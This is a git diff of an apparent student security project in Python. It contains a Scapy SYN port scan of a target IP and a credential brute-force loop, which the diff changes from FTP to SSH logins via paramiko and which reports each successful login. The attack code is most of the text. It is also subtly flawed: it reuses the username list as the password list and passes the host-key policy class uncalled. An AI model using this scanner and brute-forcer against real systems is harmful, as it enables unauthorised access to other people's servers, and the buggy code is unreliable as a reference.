@@ -60,7 +60,7 @@ for i in range(100, 105):
 
 cel = target_IP
 pakiet = IP(dst="google.com")/ICMP()/"Projekt"
-for port in range(22):
+for port in range(23):
     pakiet = IP(dst=cel)/TCP(dport=[port], flags = "S")
     rec, wrong = sr(pakiet, timeout=1, verbose=0) #timeout - dlugosc zycia, verbose - ilosc wyswietlanych inf zwrotnych 0 - 3
     print(rec)
@@ -93,21 +93,32 @@ for port in range(1, 65000):
         pass
 
 ############################################ 6 - Brute Force ########################################
-
+import paramiko
 import ftplib
-users = open("usernames.txt", "r")
-passwords = open("passlist.txt", "r")
+
+with open('correctpasses.txt') as f:
+    users = f.read().splitlines()
+# passwords = open("correctpasses.txt", "r") as ff:
+#     passwords = ff.read().splitlines()
 
 target = target_IP
+ssh_server = paramiko.SSHClient()
+ssh_server.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+ssh_server.load_system_host_keys()
+port = 22
+
 for user in users:
-    for password in passwords:
+    for password in users:
         print(f"Trying> {user}:{password}")
 
         try:
-            ftp_server = ftplib.FTP()
-            ftp_server.connect(target, 21, timeout=2)
-            ftp_server.login(user, password)
-            print("[+] Login successful.")
-            ftp_server.close()
+
+            print(f"[*] Trying> {user}:{password}", end="")
+            ssh_server.connect(target, port, user, password)
+            print(f" - SUCCESS")
+
+            ssh_server.close()
+
         except Exception as exc:
             print("[-] Brute-force attack failed!")
+
